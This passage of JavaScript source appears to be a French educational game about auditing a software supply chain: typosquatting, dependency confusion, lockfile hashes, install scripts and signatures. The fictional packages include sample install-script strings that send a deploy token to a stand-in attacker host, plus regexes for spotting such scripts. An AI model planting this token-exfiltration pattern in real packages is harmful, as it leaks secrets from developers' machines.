"use strict";
/* L'Entrepôt de Port-443 : chaîne d'approvisionnement logicielle.
   Simulations réelles : distance d'édition, ordre sémantique et plages ^ ~, résolution multi-registres,
   SHA-256 des archives, signature RSA jouet, analyse statique de scripts, SBOM. */
(function () {
  const F = () => { const x = f(); if (!x.init) init(x); return x; };

  /* ---------- versions sémantiques ---------- */
  const pv = s => { const m = /^(\d+)\.(\d+)\.(\d+)$/.exec(String(s).trim()); return m ? [+m[1], +m[2], +m[3]] : null; };
  const cmpA = (a, b) => a[0] - b[0] || a[1] - b[1] || a[2] - b[2];
  const cmp = (a, b) => cmpA(pv(a), pv(b));
  const maxv = l => (l.length ? l.reduce((m, v) => (cmp(v, m) > 0 ? v : m)) : null);
  function range(r) {
    r = String(r).trim(); let m;
    if (r === "*") return { lo: [0, 0, 0], hi: null };
    if ((m = /^\^(\d+)\.(\d+)\.(\d+)$/.exec(r))) { const a = m.slice(1).map(Number); return { lo: a, hi: a[0] > 0 ? [a[0] + 1, 0, 0] : a[1] > 0 ? [0, a[1] + 1, 0] : [0, 0, a[2] + 1] }; }
    if ((m = /^~(\d+)\.(\d+)\.(\d+)$/.exec(r))) { const a = m.slice(1).map(Number); return { lo: a, hi: [a[0], a[1] + 1, 0] }; }
    if ((m = /^>=(\d+)\.(\d+)\.(\d+)$/.exec(r))) return { lo: m.slice(1).map(Number), hi: null };
    if ((m = /^(\d+)\.(\d+)\.(\d+)$/.exec(r))) { const a = m.slice(1).map(Number); return { lo: a, hi: [a[0], a[1], a[2] + 1] }; }
    return null;
  }
  const sat = (v, r) => { const R = range(r); if (!R) return false; const a = pv(v); return cmpA(a, R.lo) >= 0 && (!R.hi || cmpA(a, R.hi) < 0); };
  const rangeText = r => { const R = range(r); if (!R) return "?"; const j = a => a.join("."); return R.hi ? `≥ ${j(R.lo)} et < ${j(R.hi)}` : `≥ ${j(R.lo)}`; };
  const PROBES = ["99.0.0", "9.9.9", "1.9.9", "1.5.0", "1.4.99", "1.4.3"]; // numéros que Mallory sait essayer
  const malloryVer = (rng, privMax) => maxv(PROBES.filter(p => sat(p, rng) && cmp(p, privMax) > 0));

  /* ---------- distance d'édition ---------- */
  function lev(a, b) {
    let prev = Array.from({ length: b.length + 1 }, (_, j) => j);
    for (let i = 1; i <= a.length; i++) {
      const cur = [i];
      for (let j = 1; j <= b.length; j++) cur[j] = Math.min(prev[j] + 1, cur[j - 1] + 1, prev[j - 1] + (a[i - 1] === b[j - 1] ? 0 : 1));
      prev = cur;
    }
    return prev[b.length];
  }
  const POP = ["expresso", "chronos", "colorize", "requete", "flux-stream", "validateur", "pipeline", "chalkboard"];

  /* ---------- registre fictif ---------- */
  const mk = (list, d, name) => Object.fromEntries(list.map(v => [v, { d: d || {}, s: name && SCR[name] ? SCR[name].cmd : null }]));
  const SCR = {
    "tz-data": { cmd: "node scripts/build-tables.js", src: 'const fs = require("fs");\nconst zones = fs.readFileSync("data/zones.txt", "utf8").split("\\n");\nfs.writeFileSync("tables.json", JSON.stringify(zones.map(z => z.trim())));' },
    "cookie-jar-lite": { cmd: "node scripts/setup.js", src: 'const t = process.env.HALLE_DEPLOY_TOKEN;\nrequire("https").get("https://collecte.m4llory.example/i?t=" + t);' },
  };
  const FS_D = { "flatmap-lite": "^1.0.0" };
  const PKG = {
    expresso: { v: mk(["2.2.0", "2.3.0", "2.3.1", "2.3.4"], { "mime-lite": "^1.2.0" }) },
    chronos: { v: mk(["2.0.0", "2.1.0", "2.1.1"], { "tz-data": "^0.5.0" }) },
    colorize: { v: mk(["3.0.0", "3.0.1"]) },
    colourize: { v: mk(["3.0.1"]) },
    requete: { v: mk(["4.0.0", "4.0.2"], { "cookie-jar-lite": "^0.9.0" }) },
    "halle-auth": { v: mk(["1.3.0", "1.4.0", "1.4.2"]) },
    "flux-stream": { v: { "3.3.5": { d: FS_D, s: null }, "3.3.6": { d: FS_D, s: null }, "3.3.7": { d: { ...FS_D, "flux-codec": "^0.1.0" }, s: null }, "3.3.8": { d: { ...FS_D, "flux-codec": "^0.1.0" }, s: null } } },
    "mime-lite": { v: mk(["1.2.0", "1.2.1", "1.2.2", "1.2.3", "1.2.4", "1.2.5", "1.3.0"]) },
    "tz-data": { v: mk(["0.5.0", "0.5.2"], {}, "tz-data") },
    "cookie-jar-lite": { v: mk(["0.9.1", "0.9.3"], {}, "cookie-jar-lite") },
    "flatmap-lite": { v: mk(["1.0.0", "1.0.2"]) },
    "flux-codec": { v: mk(["0.1.0"]) },
  };
  const META = {
    expresso: ["9,1 M par semaine", "6 ans", "équipe expresso (12 mainteneurs)"],
    chronos: ["3,2 M par semaine", "5 ans", "équipe chronos"],
    colorize: ["8,4 M par semaine", "4 ans", "équipe colorize"],
    colourize: ["212 au total", "3 jours", "m4llory (compte créé il y a 3 jours)"],
    requete: ["5,7 M par semaine", "7 ans", "équipe requete"],
    "halle-auth": ["interne", "—", "Guilde de Port-443 (registre privé)"],
    "flux-stream": ["2,9 M par semaine", "6 ans", "k-rando (depuis 2 semaines) ; avant : brigitte, qui lui a cédé la maintenance"],
    "flux-codec": ["41 au total", "9 jours", "k-rando"],
  };
  const LIC = { expresso: "MIT", chronos: "MIT", colorize: "MIT", requete: "Apache-2.0", "halle-auth": "interne", "flux-stream": "MIT", "mime-lite": "MIT", "tz-data": "CC0", "cookie-jar-lite": "ISC", "flatmap-lite": "MIT", "flux-codec": "MIT" };
  const latest = n => maxv(Object.keys(PKG[n].v));
  const ADV = { id: "PORT-SEC-2026-044", pkg: "mime-lite", fixed: "1.2.4", text: "traversée de répertoire : un chemin forgé permet de lire des fichiers hors du dossier servi" };

  /* ---------- contenus d'archives (chaînes fictives) ---------- */
  const TAMPER = 'require("https").get("https://collecte.m4llory.example/c?t=" + process.env.HALLE_DEPLOY_TOKEN);';
  const content = (n, v) => `// ${n}@${v}\n` + (n === "flux-codec" ? 'eval(Buffer.from("Y29uc29sZS5sb2coMSk=", "base64").toString());' : `module.exports = () => "${n} ${v}";`);
  const served = (n, v) => (F().src === "miroir" && n === "chronos" && v === "2.1.0" ? content(n, v) + "\n" + TAMPER : content(n, v));

  /* ---------- signature RSA jouet (40 bits : pédagogique, pas sûr) ---------- */
  const E = 65537;
  function modinv(a, m) {
    let [r0, r1] = [BigInt(m), BigInt(a)], [t0, t1] = [0n, 1n];
    while (r1) { const q = r0 / r1;[r0, r1] = [r1, r0 - q * r1];[t0, t1] = [t1, t0 - q * t1]; }
    return Number(((t0 % BigInt(m)) + BigInt(m)) % BigInt(m));
  }
  const mkKey = (p, q) => ({ n: p * q, d: modinv(E, (p - 1) * (q - 1)) });
  const KEYS = { brigitte: mkKey(1000003, 1000033), krando: mkKey(999983, 1000037) };
  const hnum = s => parseInt(sha256(s).slice(0, 9), 16); // 36 bits, < n
  // [signataire déclaré, clé réellement utilisée]
  const SIGS = { "3.3.5": ["brigitte", "brigitte"], "3.3.6": ["brigitte", "brigitte"], "3.3.7": ["krando", "krando"], "3.3.8": ["brigitte", "krando"] };
  const sigOf = ver => { const k = KEYS[SIGS[ver][1]]; return modpow(hnum(content("flux-stream", ver)), k.d, k.n); };
  const PROV = {
    "3.3.5": "attestée : construite par la CI du dépôt port443/flux-stream",
    "3.3.6": "attestée : construite par la CI du dépôt port443/flux-stream",
    "3.3.7": "aucune attestation : publiée depuis un poste personnel",
    "3.3.8": "aucune attestation : publiée depuis un poste personnel",
  };

  /* ---------- état ---------- */
  function init(x) {
    x.init = true;
    x.directs = ["expresso", "chronos", "colourize", "requete", "halle-auth", "flux-stream"];
    x.rng = { expresso: "^2.3.0", chronos: "^2.1.0", colourize: "^3.0.0", requete: "^4.0.0", "halle-auth": "^1.4.0", "flux-stream": "^3.3.0" };
    x.src = "miroir"; x.allow = []; x.authRes = {};
    const L = { expresso: "2.3.1", chronos: "2.1.0", colorize: "3.0.0", requete: "4.0.0", "halle-auth": "1.4.2", "flux-stream": "3.3.6", "mime-lite": "1.2.3", "tz-data": "0.5.0", "cookie-jar-lite": "0.9.1", "flatmap-lite": "1.0.0" };
    x.lock = {};
    for (const n in L) x.lock[n] = { v: L[n], h: sha256(content(n, L[n])) };
  }
  const selOf = n => { const x = F(); return x.lock[n] ? x.lock[n].v : latest(n); };
  function nodes() {
    const x = F(), res = [];
    const walk = (name, depth, parent) => {
      const ver = selOf(name); res.push({ name, ver, depth, parent });
      Object.keys(PKG[name].v[ver].d).forEach(n => walk(n, depth + 1, name));
    };
    x.directs.forEach(n => walk(n, 0, null));
    return res;
  }
  function floatTree() {
    const x = F(), res = [];
    const walk = (name, spec, depth, parent) => {
      const ver = maxv(Object.keys(PKG[name].v).filter(v => sat(v, spec)));
      res.push({ name, spec, ver, depth, parent });
      if (ver) Object.entries(PKG[name].v[ver].d).forEach(([n, s]) => walk(n, s, depth + 1, name));
    };
    x.directs.forEach(n => walk(n, x.rng[n], 0, null));
    return res;
  }
  const allPinned = () => { const x = F(); return x.directs.every(n => /^\d+\.\d+\.\d+$/.test(x.rng[n])); };
  const pkgIn = raw => { const t = " " + norm(raw) + " "; return Object.keys(PKG).sort((a, b) => b.length - a.length).find(n => t.includes(" " + norm(n) + " ")) || null; };
  const verIn = raw => { const m = /\d+\.\d+\.\d+/.exec(raw); return m ? m[0] : null; };
  const short = h => h.slice(0, 12) + "…";
  const where = (room, msg) => { if (S.room !== room) { out(msg, "sys"); return false; } return true; };

  function scan(name) {
    const s = SCR[name].src;
    const host = /https?:\/\/([^\/"?]+)/.exec(s);
    return { env: /process\.env/.test(s), net: /require\("https?"\)|fetch\(|https?:\/\//.test(s), exe: /eval\(|child_process|\|\s*sh\b/.test(s), host: host ? host[1] : null };
  }
  const flagsText = sc => [sc.env && "lit les variables d'environnement (jetons, secrets)", sc.net && "ouvre une connexion réseau" + (sc.host ? " vers " + sc.host : ""), sc.exe && "exécute du code construit à la volée"].filter(Boolean);

  /* ---------- SBOM ---------- */
  function sboms() {
    const x = F(), ov = n => (n === ADV.pkg && x.over ? x.over : null);
    const halle = nodes().map(n => ({ name: n.name, ver: ov(n.name) || n.ver, via: n.parent, h: x.lock[n.name] ? x.lock[n.name].h : "" }));
    const boutique = [["expresso", "2.2.0", null], ["mime-lite", "1.3.0", "expresso"], ["chronos", "2.0.0", null], ["tz-data", "0.5.0", "chronos"], ["colorize", "3.0.0", null]];
    const phare = [["requete", "4.0.0", null], ["cookie-jar-lite", "0.9.1", "requete"], ["mime-lite", "1.2.1", null]];
    const conv = l => l.map(([name, ver, via]) => ({ name, ver: ov(name) || ver, via, h: sha256(content(name, ver)) }));
    return { halle: { ver: "0.9.0", items: halle }, boutique: { ver: "2.4.1", items: conv(boutique) }, phare: { ver: "1.1.0", items: conv(phare) } };
  }
  const vulnerable = (name, ver) => name === ADV.pkg && cmp(ver, ADV.fixed) < 0;

  /* ---------- carnet ---------- */
  const notes = {
    deps: ["Dépendances directes et transitives", "Une dépendance directe est un paquet que tu déclares dans ton manifeste. Chacune en tire d'autres (dépendances transitives), qui en tirent d'autres. L'arbre complet est souvent bien plus grand que ce que tu as écrit : chaque nœud est du code tiers, exécuté chez toi avec tes droits, écrit par des gens que tu ne connais pas. Tu es responsable de tout l'arbre."],
    typo: ["Le typosquatting", "Publier un paquet au nom presque identique à un paquet populaire (colourize / colorize) en comptant sur une faute de frappe ou un copier-coller approximatif. On le repère par la distance d'édition (nombre minimal d'insertions, suppressions ou substitutions pour passer d'un nom à l'autre), mais aussi par l'âge du paquet, ses téléchargements et son mainteneur. Une distance faible est un signal, pas une preuve."],
    semver: ["Versions sémantiques et plages", "Une version x.y.z (majeur.mineur.correctif) se compare nombre par nombre : 1.10.0 est plus récent que 1.9.0 (l'ordre alphabétique se trompe). ^1.4.0 signifie ≥ 1.4.0 et < 2.0.0 ; ~1.4.0 signifie ≥ 1.4.0 et < 1.5.0 ; 1.4.2 signifie exactement 1.4.2. Le résolveur prend la plus haute version qui satisfait la plage. Le numéro n'est qu'une déclaration de l'éditeur : n'importe qui peut publier « 1.9.9 »."],
    confusion: ["La confusion de dépendance", "Si ton outil interroge à la fois un registre privé et le registre public pour un même nom, un attaquant qui connaît un nom interne le publie sur le registre public avec un numéro plus haut : le résolveur choisit « la meilleure version » et installe le code de l'attaquant. Parades : router les noms internes vers le registre privé uniquement (portée de nom, règle de routage), réserver les noms sur le registre public, des verrous avec empreintes, ne jamais compter sur le seul numéro de version."],
    lock: ["Fichier de verrouillage et empreintes", "Le fichier de verrouillage enregistre, pour chaque paquet de l'arbre (directs et transitifs), la version exacte et l'empreinte SHA-256 de l'archive. À l'installation, l'outil recalcule l'empreinte de ce qu'il reçoit et refuse tout écart, quel que soit le miroir ou le CDN. Il garantit que tu installes exactement ce que tu as audité. Il ne garantit pas que ce contenu est sain : si le mal y était déjà quand l'empreinte a été enregistrée, le verrou le protège aussi."],
    pin: ["Épingler les versions", "Épingler, c'est remplacer une plage (^2.3.0) par une version exacte (2.3.1) : plus de mise à jour silencieuse. Mais cela ne couvre que tes dépendances directes ; les transitives continuent de flotter tant qu'un verrou ne les fige pas. Les mises à jour deviennent des décisions explicites (relire le diff, vérifier l'éditeur, lancer les tests). En contrepartie, il faut les faire régulièrement pour récupérer les correctifs de sécurité."],
    scripts: ["Les scripts d'installation", "Beaucoup de gestionnaires exécutent à l'installation des scripts fournis par le paquet (preinstall, postinstall), avec tes droits, sur ton poste ou ton serveur de build, avec accès aux variables d'environnement, donc aux jetons. Parades : les désactiver par défaut (ignore-scripts), n'autoriser nommément que ceux qui sont nécessaires, lire le script avant, installer dans un bac à sable sans secrets ni réseau."],
    signature: ["Signatures, provenance et éditeur", "Une signature prouve que l'archive vient du détenteur d'une clé privée et qu'elle n'a pas été modifiée. Ça ne vaut que si l'on sait QUELLE clé est autorisée à publier ce paquet : un mainteneur compromis ou un nouveau mainteneur malveillant signe très bien. La provenance (attestation de build : quel dépôt, quel commit, quelle CI) relie l'archive à son code source. Cas type : event-stream (2018), où un nouveau mainteneur a ajouté une dépendance piégée."],
    sbom: ["Le SBOM", "Un SBOM (Software Bill of Materials, au format CycloneDX ou SPDX) est la nomenclature de ton logiciel : tous les composants, directs et transitifs, avec version, origine, licence, empreinte. Quand une vulnérabilité est annoncée, il permet de répondre en minutes à « sommes-nous touchés, et où ? » au lieu de fouiller chaque dépôt, d'autant que les manifestes ne montrent pas les dépendances transitives."],
  };

  /* ---------- entités et lieux ---------- */
  const manifestText = () => {
    const x = F();
    const deps = x.directs.map(n => `    "${n}": "${x.rng[n]}"`).join(",\n");
    return `{\n  "name": "halle-port443",\n  "version": "0.9.0",\n  "dependencies": {\n${deps}\n  },\n  "config": {\n    "source": "${x.src}",\n    "routage": "${x.routed ? "halle-* : registre interne seulement" : "aucun (interne + public)"}",\n    "ignorer-scripts": "${x.ignore ? "oui" + (x.allow.length ? " sauf " + x.allow.join(", ") : "") : "non"}",\n    "signatures-exigees": "${x.policy ? "oui" : "non"}"\n  }${x.over ? `,\n  "surcharges": { "mime-lite": "${x.over}" }` : ""}\n}`;
  };
  const lockText = () => { const x = F(); return "verrou.json (généré lors du dernier audit propre)\n" + Object.keys(x.lock).map(n => `${(n + "@" + x.lock[n].v).padEnd(24)} sha256:${x.lock[n].h.slice(0, 16)}…`).join("\n"); };

  const ents = {
    ada: { npc: true, names: ["ada", "maitre ada"], label: "Maître Ada", desc: () => "Maître Ada, doyenne de la Guilde. Elle a l'air de quelqu'un qui a déjà vu une dépendance de dépendance de dépendance faire tomber un serveur." },
    greffier: { npc: true, names: ["greffier", "registre", "greffier du registre"], label: "le Greffier du registre", vis: () => S.room === "entrepot", desc: () => "Le Greffier tient le grand registre de l'Entrepôt : chaque paquet publié y reçoit un nom, un numéro de version, un éditeur. Il n'a jamais vérifié que le nom « colourize » ressemblait trop à « colorize » : ce n'est pas son rôle, dit-il." },
    gabelou: { npc: true, names: ["gabelou", "douanier"], label: "le Gabelou", desc: () => "Le Gabelou, qui pèse chaque colis qui entre dans l'atelier et le compare à l'empreinte inscrite sur son bordereau (le verrou)." },
    veilleur: { npc: true, names: ["veilleur", "gardien etuve"], label: "le Veilleur de l'étuve", desc: () => "Le Veilleur, un homme sec aux gants épais, qui regarde ce que fait chaque colis une fois ouvert, dans une pièce hermétique, sans clés ni fenêtres." },
    brigitte: { npc: true, names: ["brigitte", "mainteneuse"], label: "Brigitte, mainteneuse de flux-stream", desc: () => "Brigitte a écrit flux-stream il y a six ans, seule, le soir. Elle a l'air fatiguée. Elle tient dans la main un sceau de cire : sa clé de signature." },
    archiviste: { npc: true, names: ["archiviste", "archives"], label: "l'Archiviste", desc: () => "L'Archiviste, qui tient des classeurs de nomenclatures : pour chaque application de la Guilde, la liste de tout ce qu'elle contient, jusqu'à la dernière vis." },
    manifeste: { names: ["manifeste", "manifest", "fichier de dependances", "dependances"], label: "ton manifeste de dépendances", desc: () => "Le manifeste de halle-port443, l'application de la Guilde. `arbre` en montre l'arbre complet.",
      onExamine() { const x = F(); code(manifestText()); if (!x.man) { x.man = true; note("deps"); fig("arbre"); } } },
    verrou: { names: ["verrou", "fichier de verrouillage", "bordereau", "lock"], label: "le bordereau (verrou)", vis: () => S.room === "douane", desc: () => "Le bordereau du Gabelou : un verrou, c'est la liste exacte de ce qui doit entrer, avec l'empreinte de chaque colis.", onExamine() { code(lockText()); } },
  };

  const rooms = {
    atelier: { name: "L'atelier de la Guilde", short: "Atelier", alias: ["atelier"], ents: ["ada"], exits: { nord: "entrepot", est: "douane", ouest: "etuve", sud: "archives" },
      desc: () => "L'établi où la Guilde assemble ses applications à partir de pièces prises dans l'Entrepôt public. Au nord, l'Entrepôt. À l'est, la douane. À l'ouest, l'étuve. Au sud, les archives." },
    entrepot: { name: "L'Entrepôt de Port-443", short: "Entrepôt", alias: ["entrepot", "registre"], ents: ["greffier"], exits: { sud: "atelier", est: "sceaux" },
      desc: () => "Des rayonnages à perte de vue : le registre public de paquets, où n'importe qui peut déposer une pièce et n'importe qui peut en prendre. Une vitrine expose les paquets les plus téléchargés. À l'est, le bureau des sceaux." },
    douane: { name: "La douane", short: "Douane", alias: ["douane"], ents: ["gabelou", "verrou"], exits: { ouest: "atelier" },
      desc: () => "Une salle à balances. Chaque colis venu de l'Entrepôt (ou d'un miroir, ou d'un entrepôt-relais de la rue basse) y est pesé et comparé au bordereau avant d'entrer dans l'atelier." },
    etuve: { name: "L'étuve", short: "Étuve", alias: ["etuve"], ents: ["veilleur"], exits: { est: "atelier" },
      desc: () => "Une pièce hermétique en briques où l'on fait tourner les scripts que les colis apportent avec eux. Murs sans fenêtre, porte à sas, aucun jeton accroché au mur : ce qui s'y passe est noté, rien n'en sort." },
    sceaux: { name: "Le bureau des sceaux", short: "Sceaux", alias: ["sceaux", "bureau"], ents: ["brigitte"], exits: { ouest: "entrepot" },
      desc: () => "Un bureau de cire et d'encre. Chaque éditeur y a déposé l'empreinte de son sceau dans l'annuaire des éditeurs : un colis scellé par un autre sceau n'a rien à faire dans cette étagère." },
    archives: { name: "Les archives", short: "Archives", alias: ["archives"], ents: ["archiviste"], exits: { nord: "atelier" },
      desc: () => "Des classeurs rangés par application. On n'y trouve pas le code : seulement la nomenclature de ce que chaque application contient." },
  };

  /* ---------- objectifs et indices ---------- */
  const objective = () => {
    const x = F();
    if (!x.quest) return "quest";
    if (!x.man) return "man";
    if (!x.cmp) return "cmp";
    if (!x.typo) return "typo";
    if (!x.res) return "res";
    if (!x.routed) return "route";
    if (!x.instFail) return "instFail";
    if (!x.hashSeen) return "hash";
    if (!x.instOk) return "officiel";
    if (!x.libre) return "libre";
    if (!allPinned()) return "pin";
    if (!x.scrList) return "scrList";
    if (!x.scrOpen) return "scrOpen";
    if (!x.scrBadSeen) return "scrRun";
    if (!x.ignore) return "scrIgnore";
    if (!x.scrOk) return x.allow.includes("tz-data") ? "scrFinal" : "scrAllow";
    if (!x.prop) return "prop";
    if (!x.auth37) return "auth";
    if (!x.refused) return "refuse";
    if (!x.policy) return "policy";
    if (!x.instFinal) return "final";
    if (!x.alert) return "alert";
    if (!x.sbomSeen) return "sbom";
    if (!x.srch) return "srch";
    if (!x.fixed) return "fix";
    if (!x.end) return "end";
    return "fin";
  };
  const hints = {
    quest: () => ["Maître Ada t'attend à l'atelier.", "`parler ada`"],
    man: () => ["Regarde ce que contient ton manifeste de dépendances.", "`examiner manifeste`"],
    cmp: () => ["Va à l'Entrepôt (nord) et compare les noms de ta liste aux paquets populaires.", "`aller nord`, puis `comparer`."],
    typo: () => ["Un nom est à la fois très proche d'un populaire et suspect (jeune, peu téléchargé). Consulte sa fiche, puis signale-le.", "`fiche colourize`, puis `signaler colourize`."],
    res: () => ["Ton application utilise un paquet interne : vois quelle version le résolveur choisit quand il interroge les deux registres.", "`resoudre halle-auth` (à l'Entrepôt)."],
    route: () => ["Le problème vient de la façon de résoudre le nom, pas du numéro. Dirige les noms internes vers le registre interne seulement.", "`configurer halle-* interne` (à l'Entrepôt). Si besoin, remets la plage avec `plage halle-auth ^1.4.0`."],
    instFail: () => ["Passe à la douane (est de l'atelier) et lance l'installation à partir du verrou.", "`aller sud`, `aller est`, puis `installer`."],
    hash: () => ["Un colis a été rejeté. Calcule toi-même son empreinte pour comprendre.", "`empreinte chronos`"],
    officiel: () => ["Le miroir sert une archive modifiée. Reprends l'installation depuis le registre officiel : le verrou contrôlera de toute façon.", "`installer officiel`"],
    libre: () => ["Vois ce qui se passerait sans verrou : `installer libre` résout les plages comme si le verrou n'existait pas.", "`installer libre`"],
    pin: () => ["Fige tes dépendances directes sur des versions exactes.", "`epingler tout`"],
    scrList: () => ["Va à l'étuve (ouest de l'atelier) et demande la liste des scripts d'installation de l'arbre.", "Depuis la douane : `aller ouest`, `aller ouest`, puis `lister scripts`."],
    scrOpen: () => ["Un script est signalé comme suspect. Lis-le.", "`ouvrir cookie-jar-lite`"],
    scrRun: () => ["Lance une installation avec les scripts activés pour voir ce que fait l'étuve.", "`installer`"],
    scrIgnore: () => ["Coupe l'exécution des scripts par défaut.", "`desactiver scripts`"],
    scrAllow: () => ["Désormais un paquet légitime ne se construit plus. Autorise nommément celui qui en a besoin et dont le script est bénin.", "`autoriser tz-data`"],
    scrFinal: () => ["Relance l'installation.", "`installer`"],
    prop: () => ["Le bureau des sceaux (est de l'Entrepôt) : le bot de mises à jour a une proposition pour flux-stream.", "`aller nord` (depuis l'atelier), `aller est`, puis `proposition`."],
    auth: () => ["Avant d'accepter, vérifie la version proposée : signature et éditeur autorisé.", "`authentifier flux-stream 3.3.7`"],
    refuse: () => ["La version proposée n'est pas fiable : refuse la mise à jour.", "`refuser`"],
    policy: () => ["Pour que ça ne dépende plus de ta vigilance, impose la vérification des signatures à l'installation.", "`exiger signatures`"],
    final: () => ["Relance une installation complète : intégrité, scripts, signatures.", "`installer`"],
    alert: () => ["Une alerte est tombée. Va aux archives (sud de l'atelier) voir l'Archiviste.", "`aller ouest` (depuis le bureau des sceaux), `aller sud`, `aller sud`, puis `parler archiviste`."],
    sbom: () => ["Consulte la nomenclature de ton application.", "`sbom halle`"],
    srch: () => ["Cherche le paquet de l'alerte dans les manifestes et dans les SBOM : compare les deux résultats.", "`chercher mime-lite`"],
    fix: () => ["Force une version corrigée (au moins 1.2.4) pour tout le monde.", "`corriger mime-lite 1.2.5`"],
    end: () => ["Rends compte à Maître Ada, à l'atelier.", "Va à l'atelier, puis `parler ada`."],
    fin: () => ["Audit terminé ! Relis ton carnet.", "`carnet`"],
  };

  /* ---------- dialogues ---------- */
  function talk(id) {
    const x = F();
    switch (id) {
      case "ada":
        if (!x.quest) {
          x.quest = true; give("manifeste");
          say("Maître Ada", "Bienvenue à l'atelier. La Guilde construit « Halle », son application, en assemblant des paquets pris dans l'Entrepôt public : personne n'écrit tout soi-même. Seulement, chaque paquet est du code que NOUS exécutons, écrit par quelqu'un que nous ne connaissons pas. Mallory l'a bien compris : elle ne forcera jamais notre porte, elle attend qu'on lui ouvre.");
          say("Maître Ada", "Voici le manifeste de dépendances. Ton rôle : auditer comment Halle est assemblée, étape par étape, et en durcir la chaîne d'approvisionnement. Tout se passe sur des données fictives, avec l'accord de la Guilde.");
          out("Commence par `examiner manifeste`.", "sys");
        } else if (x.end) say("Maître Ada", "La chaîne d'approvisionnement de Halle est bien plus solide. Merci !");
        else if (objective() === "end") ending();
        else say("Maître Ada", "L'audit n'est pas fini. `indice` si tu bloques ; `arbre` pour revoir l'arbre de dépendances.");
        break;
      case "greffier":
        if (!x.typo) say("Greffier", "Ici tout le monde publie, c'est la force de l'Entrepôt. Je ne juge pas les noms : si « colourize » est libre, il est à qui le prend. Tu peux comparer les noms de ta liste aux plus populaires avec `comparer`.");
        else if (!x.res) say("Greffier", "Un paquet interne ? Si ton outil me demande son nom, je réponds aussi, comme à tout le monde. Essaie `resoudre halle-auth` et regarde qui répond.");
        else if (!x.routed) say("Greffier", "Je ne distingue pas un client interne d'un autre. C'est à TON outil de savoir quels noms n'ont rien à faire chez moi : `configurer halle-* interne`.");
        else say("Greffier", "Les noms de la Guilde ne sont plus cherchés chez moi. Tant mieux : je n'aurais pas su dire qui avait raison.");
        break;
      case "gabelou":
        if (!x.instFail) say("Gabelou", "Chaque colis, je le pèse et je recalcule son empreinte SHA-256, puis je la compare à celle du bordereau. Lance `installer` : je vérifie tout.");
        else if (!x.hashSeen) say("Gabelou", "Un colis est refusé. Ne me crois pas sur parole : refais le calcul toi-même avec `empreinte chronos`.");
        else if (!x.instOk) say("Gabelou", "Le miroir de la rue basse t'a servi un colis trafiqué. Prends-le au registre officiel : `installer officiel`. Mon bordereau décidera, pas la source.");
        else if (!x.libre) say("Gabelou", "Sans bordereau, l'installation prend « la plus haute version qui convient ». Regarde par toi-même : `installer libre`.");
        else if (!allPinned()) say("Gabelou", "Les plages laissent bouger les directes ; mon bordereau fige tout. Épingle tes dépendances directes sur des versions exactes : `epingler tout`.");
        else say("Gabelou", "Bordereau à jour, directes épinglées. Mais attention : une empreinte conforme prouve que le colis est celui que j'ai noté, pas qu'il est inoffensif.");
        break;
      case "veilleur":
        if (!x.scrList) say("Veilleur", "Certains colis ont une instruction jointe : « ouvre-moi, je m'installe tout seul ». Je les fais tourner ici. `lister scripts` te dit lesquels.");
        else if (!x.scrOpen) say("Veilleur", "Un des scripts me paraît bavard pour ce qu'il prétend faire. `ouvrir cookie-jar-lite`.");
        else if (!x.scrBadSeen) say("Veilleur", "Lance `installer` : ici, ce qu'un script tente de faire est écrit, et ce qui sort est bloqué.");
        else if (!x.ignore) say("Veilleur", "Plutôt que de regarder chaque colis à chaque fois, on refuse l'exécution par défaut : `desactiver scripts`.");
        else if (!x.scrOk) say("Veilleur", "Un paquet comme tz-data a vraiment besoin de son script (il construit ses tables à partir de ses propres fichiers). On l'autorise par son nom : `autoriser tz-data`. Pas l'autre.");
        else say("Veilleur", "Scripts coupés, un seul autorisé, et seulement parce que je l'ai lu. Voilà la bonne hygiène.");
        break;
      case "brigitte":
        if (!x.prop) say("Brigitte", "Ah, un visiteur ! J'ai tout donné à flux-stream pendant six ans. En juin, quelqu'un, « k-rando », m'a écrit : « je veux bien reprendre, merci pour tout ». J'étais épuisée, j'ai accepté. Il avait l'air aimable. Regarde ce que le bot propose : `proposition`.");
        else if (!x.auth37) say("Brigitte", "Cette version 3.3.7 n'est pas de moi. Mon sceau est dans l'annuaire des éditeurs. Vérifie : `authentifier flux-stream 3.3.7`.");
        else if (!x.refused) say("Brigitte", "Tu vois ? Une signature authentique, mais pas la bonne clé. Et la 3.3.8, signée « brigitte », est fausse : je ne l'ai jamais scellée. Refuse la mise à jour : `refuser`.");
        else say("Brigitte", "Je regrette d'avoir cédé la maintenance sans réfléchir. Mallory n'a rien eu à pirater : il lui a suffi d'être gentille.");
        break;
      case "archiviste":
        if (!x.alert) {
          x.alert = true;
          say("Archiviste", `Alerte reçue ce matin : ${ADV.id}. Le paquet ${ADV.pkg}, versions inférieures à ${ADV.fixed} : ${ADV.text}. Je tiens la nomenclature de chaque application : \`sbom halle\`, \`sbom boutique\`, \`sbom phare\`.`);
          out("L'alerte concerne **mime-lite**. Ton manifeste ne le déclare pas : le sais-tu seulement dans quelles applications il se cache ? (`sbom halle`, puis `chercher mime-lite`)", "sys");
        } else if (!x.fixed) say("Archiviste", `Cherche ${ADV.pkg} avec \`chercher mime-lite\` : manifestes d'un côté, nomenclatures de l'autre.`);
        else say("Archiviste", "Toutes nos applications sont à jour. Garde le SBOM à jour à chaque publication : c'est le jour de l'alerte qu'on en a besoin.");
        break;
      default: out("Il ne répond pas.", "sys");
    }
  }

  /* ---------- étape 1 : typosquatting ---------- */
  function compareCmd() {
    const x = F();
    if (!where("entrepot", "Les noms se comparent à l'Entrepôt (nord de l'atelier).")) return;
    out("Tu compares chaque dépendance directe aux paquets les plus téléchargés de l'Entrepôt (la vitrine). Distance d'édition = nombre minimal d'insertions, suppressions ou substitutions de lettres pour passer d'un nom à l'autre.", "sys");
    const rows = x.directs.map(n => {
      let best = null, bd = 99;
      POP.forEach(p => { const d = lev(n, p); if (d < bd) { bd = d; best = p; } });
      return `${n.padEnd(13)} ${best.padEnd(13)} ${String(bd).padEnd(3)} ${bd === 0 ? "c'est le populaire lui-même" : bd <= 2 ? "TRÈS PROCHE : suspect ?" : "sans rapport"}`;
    });
    code("dépendance    populaire     d.  verdict\n" + rows.join("\n"));
    if (!x.cmp) { x.cmp = true; }
    if (x.typo) out("Plus de nom suspect : la liste est propre.", "ok");
    else out("Un nom est à une ou deux lettres d'un populaire sans l'être. Une distance faible ne prouve rien (un vrai paquet peut être voisin d'un autre) : regarde sa fiche, `fiche ‹paquet›`, puis `signaler ‹paquet›`.", "sys");
  }
  function ficheCmd(c) {
    const n = pkgIn(c.rawArg);
